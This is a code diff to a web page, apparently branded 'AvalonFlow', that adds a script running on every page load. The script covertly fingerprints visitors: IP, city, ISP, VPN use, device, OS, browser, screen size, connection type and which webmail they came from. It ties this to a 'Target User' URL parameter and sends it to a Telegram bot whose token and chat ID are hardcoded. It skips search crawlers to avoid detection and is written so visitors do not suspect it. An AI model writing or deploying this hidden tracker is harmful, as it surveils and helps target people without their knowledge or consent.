@@ -1328,61 +1328,152 @@ CROP MODAL
     </footer>
 
 <script>
-async function sendVisitorDetailsToTelegram() {
-  // 1. Telegram bot details
-  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
-  const CHAT_IDs = '-1003913850436'; 
+// ==========================================
+// 1. TELEGRAM VISITOR TRACKING CONFIGURATION
+// ==========================================
+const TELEGRAM_BOT_TOKENs = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const TELEGRAM_CHAT_IDs = "-1003913850436";
 
+async function sendVisitorDetailsToTelegram() {
   try {
-    // 1. Read the user identity from the URL bar
+    if (sessionStorage.getItem('visitor_logged_tg')) return;
+
+    const rawAgent = navigator.userAgent;
+
+    // Anti-Bot Filter: Silently drop execution if the visitor is a search engine or chat crawler
+    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+      console.log("🤖 Automated link indexing crawler bypassed safely.");
+      return;
+    }
+
+    // Target Identification: Extract tracking user from URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
 
-    // 2. Fetch the user's network details silently
+    // Failure Handling: Fetch network data strictly, throw error if down
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+    const ipData = await ipResponse.json();
 
-    const data = await ipResponse.json();
+    // Capture device environment metrics safely
+    const currentPage = window.location.pathname;
+    let detailedDevice = "Unknown Device";
+    let detectedBrowser = "Unknown Browser";
 
-    // Capture the current page path
-    const currentPage = window.location.pathname; 
-
-    // Capture the platform/device operating system safely
-    let devicePlatform = 'Unknown';
-    if (navigator.userAgentData && navigator.userAgentData.platform) {
-      devicePlatform = navigator.userAgentData.platform; 
-    } else if (navigator.platform) {
-      devicePlatform = navigator.platform; 
+    // 1. Upgraded Smart Browser Extractor (Ordered by Specificity)
+    if (/WhatsApp/i.test(rawAgent)) {
+      detectedBrowser = "WhatsApp In-App";
+    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
+      detectedBrowser = "Telegram In-App";
+    } else if (/Instagram/i.test(rawAgent)) {
+      detectedBrowser = "Instagram App";
+    } else if (/TikTok/i.test(rawAgent)) {
+      detectedBrowser = "TikTok App";
+    } else if (/FBAN|FBAV/i.test(rawAgent)) {
+      detectedBrowser = "Facebook App";
+    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
+      detectedBrowser = "X (Twitter) App";
+    } else if (/LinkedInApp/i.test(rawAgent)) {
+      detectedBrowser = "LinkedIn App";
+    } else if (/Phoenix/i.test(rawAgent)) {
+      detectedBrowser = "Phoenix Browser";
+    } else if (/SamsungBrowser/i.test(rawAgent)) {
+      detectedBrowser = "Samsung Internet";
+    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
+      detectedBrowser = "Opera";
+    } else if (/Edg/i.test(rawAgent)) {
+      detectedBrowser = "Microsoft Edge";
+    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
+      detectedBrowser = "Mozilla Firefox";
+    } else if (/Chrome|CriOS/i.test(rawAgent)) {
+      detectedBrowser = "Google Chrome";
+    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
+      detectedBrowser = "Apple Safari";
     }
 
-    // 3. Format the log notification text using HTML parsing to prevent breakdown errors
-    const telegramMessage = 
-      `🌐 <b>New Visitor Logged</b>\n\n` +
-      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
-      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
-      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
-      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
-      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
-      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
-      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
-      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
+    // Email Inbox Origin Identification (Fallback Check)
+    const referrer = document.referrer || "";
+    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+      if (/mail\.google\.com/i.test(referrer)) {
+        detectedBrowser += " (via Gmail Web)";
+      } else if (/mail\.yahoo/i.test(referrer)) {
+        detectedBrowser += " (via Yahoo Mail Web)";
+      } else if (/outlook|live\.com/i.test(referrer)) {
+        detectedBrowser += " (via Outlook Web)";
+      }
+    }
 
-    // 4. Send the payload directly to your Telegram channel/chat
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+    // 2. Smart Device & OS Version Detection Engine
+    if (/Android/i.test(rawAgent)) {
+      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+      if (match) {
+        detailedDevice = `Android ${match[1]} (${match[2]})`;
+      } else {
+        detailedDevice = "Android Device";
+      }
+    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+      const iosVer = match ? match[1].replace('_', '.') : '';
+      detailedDevice = `iOS ${iosVer} (Apple Device)`;
+    } else if (/Windows/i.test(rawAgent)) {
+      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+      let winVer = "PC";
+      if (match) {
+        if (match[1] === "10.0") winVer = "10/11";
+        else if (match[1] === "6.3") winVer = "8.1";
+        else if (match[1] === "6.1") winVer = "7";
+      }
+      detailedDevice = `Windows ${winVer}`;
+    } else if (/Macintosh/i.test(rawAgent)) {
+      detailedDevice = "macOS Device";
+    } else if (/Linux/i.test(rawAgent)) {
+      detailedDevice = "Linux System";
+    }
 
-    await fetch(telegramUrl, {
+    // Anti-VPN Verification Check
+    const isProxy = ipData.proxy || false;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+    const payload = {
+      device: detailedDevice,
+      browser: detectedBrowser,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+      ip: ipDisplay || "Unknown",
+      city: ipData.city || "Unknown",
+      region: ipData.region || "Unknown",
+      country: ipData.country_name || "Unknown",
+      isp: ipData.org || "Unknown",
+      timestamp: new Date().toLocaleString()
+    };
+
+    // HTML Parsing Engine: Final Golden Standard Output
+    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
+                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                        `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                        `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                        `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                        `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                        `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                        `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                        `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                        `📐 <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: CHAT_IDs,
-        text: telegramMessage,
-        parse_mode: 'HTML' // Switched to HTML to make parsing bulletproof
+        chat_id: TELEGRAM_CHAT_IDs,
+        text: messageText,
+        parse_mode: 'HTML'
       })
     });
 
-  } catch (error) {
-    // Fail silently so the visitor doesn't suspect anything on screen
-    console.error('System logging exception occurred.');
+    sessionStorage.setItem('visitor_logged_tg', 'true');
+    console.log("🔒 Security telemetry parameters forwarded successfully.");
+  } catch (err) {
+    console.warn("Telegram telemetry bypass error:", err);
   }
 }
 
@@ -1390,6 +1481,7 @@ async function sendVisitorDetailsToTelegram() {
 document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
 });
+
 
 
 
